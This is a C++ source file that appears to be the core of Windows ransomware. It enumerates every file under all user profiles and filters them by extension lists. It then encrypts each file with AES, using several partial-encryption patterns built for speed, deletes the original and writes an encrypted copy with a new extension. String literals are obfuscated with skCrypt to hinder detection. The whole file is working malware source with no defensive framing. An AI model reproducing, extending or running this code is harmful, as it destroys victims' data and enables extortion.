#include "headers.h"

using namespace std;
namespace fs = std::experimental::filesystem;

vector<string> globalAllFiles;
mutex allFilesMutex;

void GetAllFiles(const string& username) {
    vector<string> tmpFiles;

    for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
        tmpFiles.push_back(file);

    for (size_t i = 0; i < tmpFiles.size(); i++) {
        vector<string> fileSplitted = Split(tmpFiles[i], '.');

        for (string safeFile : safeFiles)
            if (safeFile == tmpFiles[i])
                goto erase;

        if (ENABLE_WHITELIST)
            for (string extensionW : whitelist)
                if (fileSplitted.back() == extensionW)
                    goto continue_;
        if (ENABLE_BLACKLIST)
            for (string extensionB : blacklist)
                if (fileSplitted.back() == extensionB)
                    goto erase;

    continue_:
        continue;
    erase:
        tmpFiles.erase(tmpFiles.begin() + i);
    }

    allFilesMutex.lock();
    globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
    allFilesMutex.unlock();
}

vector<string> GetFiles(const string& mainDir) {
    vector<string> result;

    if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
        vector<string> files = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
        for (string file : files) {
            vector<string> fileSplitted = Split(file, '.');

            for (string safeFile : safeFiles)
                if (safeFile == file)
                    goto continue_;

            if (ENABLE_WHITELIST)
                for (string extensionW : whitelist)
                    if (fileSplitted.back() == extensionW)
                        goto push;
            if (ENABLE_BLACKLIST)
                for (string extensionB : blacklist)
                    if (fileSplitted.back() == extensionB)
                        goto continue_;

        push:
            result.push_back(file);
        continue_:
            continue;
        }
    }

    else {
        vector<thread> threads;
        for (string user : Split(Exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
            if (!FileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                continue;
            if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                continue;

            threads.push_back(thread(GetAllFiles, user));
        }
        for (int i = 0; i < threads.size(); i++)
            threads[i].join();

        result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
    }
    result.pop_back();
    return result;
}

void EncryptFiles(const vector<string>& files, const string& key, const string& iv) {
    for (string file : files) {

        HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND || (MAX_FILE_SIZE == 0 ? false : GetFileSize(hFile, NULL) > MAX_FILE_SIZE)) {
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        ifstream fin(file, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(fin), {});
        fin.close();

        string content = (string)skCrypt("");

        if (ENCRYPTION_MODE == (string)skCrypt("HeadOnly") && data.size() > HEAD_BYTES) {
            content += aes_encrypt(key, base64_encode(&data[0], HEAD_BYTES), iv);
            content += (string)skCrypt("\n");
            content += base64_encode(&data[HEAD_BYTES], data.size() - HEAD_BYTES);
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("DotPattern")) {
            size_t index = 0;
            for (size_t c = 0; index < data.size(); c++) {
                if (c % 2 == 0) {
                    content += aes_encrypt(key, base64_encode(&data[index], min(STEP_BYTES, data.size() - index)), iv);
                    index += HEAD_BYTES;
                }
                else {
                    content += base64_encode(&data[index], min(STEP_BYTES, data.size() - index));
                    index += STEP_BYTES;
                }
                content += (string)skCrypt("\n");
            }
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("SmartPattern")) {
            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
            content += (string)skCrypt("\n");

            if (data.size() > HEAD_BYTES) {
                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), 10)) {
                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;

                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
                    content += (string)skCrypt("\n");
                    if (splitIndex < chunk.size())
                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
                    content += (string)skCrypt("\n");
                }
            }
        }
        else if (ENCRYPTION_MODE == (string)skCrypt("AdvancedSmartPattern")) {
            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
            content += (string)skCrypt("\n");

            if (data.size() > HEAD_BYTES) {
                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), NUM_BLOCKS)) {
                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;

                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
                    content += (string)skCrypt("\n");
                    if (splitIndex < chunk.size())
                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
                    content += (string)skCrypt("\n");
                }
            }
        }
        else
            content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);


        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());

        ofstream fout(file + FILE_EXTENSION, ios::out);
        fout.write((const char*)&content[0], content.size());
        fout.close();
    }
}
